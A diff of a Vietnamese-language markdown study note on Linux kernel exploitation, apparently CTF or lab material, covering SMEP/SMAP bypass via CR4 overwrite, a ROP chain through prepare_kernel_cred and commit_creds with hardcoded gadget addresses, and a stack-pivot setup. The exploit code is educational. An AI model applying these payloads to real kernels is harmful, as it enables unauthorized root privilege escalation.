@@ -99,18 +99,25 @@ void escalate_privs(void)
 ```
 
 ## modify cr4 register
+
 - Reference: @ChinoKafuu, https://ctf-wiki.mahaloz.re/pwn/linux/kernel/bypass_smep/, https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/
+
 ### smep và smap
+
 - `smep` ngăn chặn việc thực thi mã trong user mode từ kernel mode
-- nó được bật bằng cách set bit thứ 20 của thanh ghi CR4. 
+- nó được bật bằng cách set bit thứ 20 của thanh ghi CR4.
 - Enable thêm +smep vào ở -cpu và disable thêm nosmap vào -append
 - `smap` ngăn chặn việc truy cập dữ liệu trong kernel mode từ user mode
 - nó được bật bằng cách set bit thứ 21 của thanh ghi CR4.
-![Alt text](bin/image-1.png) 
+  ![Alt text](bin/image-1.png)
+
 ### bypass
+
 #### overwrite CR4
+
 - Ta sẽ cố gắng set thanh ghi `rc4 = 0x6f0` bằng native_write_cr4(value)
 - Đối với các kernel cũ thì ta chỉ cần `pop rdi`. Tuy nhiên các phiên bản kernel mới đã có chức năng `pin` các bit của `rc4` khiến chúng không thể bị overwrite
+
 ```c
 void native_write_cr4(unsigned long val)
 {
@@ -131,8 +138,11 @@ set_register:
 	}
 }
 ```
+
 # ROP chain
+
 - Cách thứ 2, ta có thể sử dụng các gadget
+
 ```
 ROP into prepare_kernel_cred(0).
 ROP into commit_creds(), with the return value from step 1 as parameter.
@@ -140,58 +150,28 @@ ROP into swapgs ; ret.
 ROP into iretq with the stack setup as RIP|CS|RFLAGS|SP|SS.
 ```
 
+- Điều kiện tốt nhất nếu ta có gadget `mov rdi, rax; ret` tuy nhiên nếu không gadget tốt nhất, ta sẽ phải set up tuỳ theo các gadget mà ta có:
+
 ```c
-unsigned long user_rip = (unsigned long)get_shell;
-
-unsigned long pop_rdi_ret = 0xffffffff81006370;
-unsigned long pop_rdx_ret = 0xffffffff81007616; // pop rdx ; ret
-unsigned long cmp_rdx_jne_pop2_ret = 0xffffffff81964cc4; // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
-unsigned long mov_rdi_rax_jne_pop2_ret = 0xffffffff8166fea3; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
-unsigned long commit_creds = 0xffffffff814c6410;
-unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
-unsigned long swapgs_pop1_ret = 0xffffffff8100a55f; // swapgs ; pop rbp ; ret
-unsigned long iretq = 0xffffffff8100c0d9;
-
-void overflow(void){
-    unsigned n = 50;
-    unsigned long payload[n];
-    unsigned off = 16;
-    payload[off++] = cookie;
-    payload[off++] = 0x0; // rbx
-    payload[off++] = 0x0; // r12
-    payload[off++] = 0x0; // rbp
-    payload[off++] = pop_rdi_ret; // return address
-    payload[off++] = 0x0; // rdi <- 0
+    payload[off++] = pop_rdi_ret;         // return address
+    payload[off++] = 0x0;                 // rdi <- 0
     payload[off++] = prepare_kernel_cred; // prepare_kernel_cred(0)
     payload[off++] = pop_rdx_ret;
-    payload[off++] = 0x8; // rdx <- 8
-    payload[off++] = cmp_rdx_jne_pop2_ret; // make sure JNE doesn't branch
-    payload[off++] = 0x0; // dummy rbx
-    payload[off++] = 0x0; // dummy rbp
-    payload[off++] = mov_rdi_rax_jne_pop2_ret; // rdi <- rax
-    payload[off++] = 0x0; // dummy rbx
-    payload[off++] = 0x0; // dummy rbp
-    payload[off++] = commit_creds; // commit_creds(prepare_kernel_cred(0))
-    payload[off++] = swapgs_pop1_ret; // swapgs
-    payload[off++] = 0x0; // dummy rbp
-    payload[off++] = iretq; // iretq frame
-    payload[off++] = user_rip;
-    payload[off++] = user_cs;
-    payload[off++] = user_rflags;
-    payload[off++] = user_sp;
-    payload[off++] = user_ss;
-
-    puts("[*] Prepared payload");
-    ssize_t w = write(global_fd, payload, sizeof(payload));
-
-    puts("[!] Should never be reached");
-}
-
+    payload[off++] = 0x8;                      // rdx <- 8
+    payload[off++] = cmp_rdx_jne_pop2_ret;     // cmp rdx, 8 ; jne 0xffffffff81964cbb ; pop rbx ; pop rbp ; ret
+    payload[off++] = 0x0;                      // dummy rbx
+    payload[off++] = 0x0;                      // dummy rbp
+    payload[off++] = mov_rdi_rax_jne_pop2_ret; // mov rdi, rax ; jne 0xffffffff8166fe7a ; pop rbx ; pop rbp ; ret
+    payload[off++] = 0x0;                      // dummy rbx
+    payload[off++] = 0x0;                      // dummy rbp
+    payload[off++] = commit_creds;             // commit_creds(prepare_kernel_cred(0))
 ```
 
 #### stack pivot
-- Trường hợp smap tắt 
+
+- Trường hợp smap tắt
 - Một ví dụ khi ta muốn stack pivot thành 0x5b000000
+
 ```c
 void build_fake_stack(void){
     fake_stack = mmap((void *)0x5b000000 - 0x1000, 0x2000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE|MAP_FIXED, -1, 0);
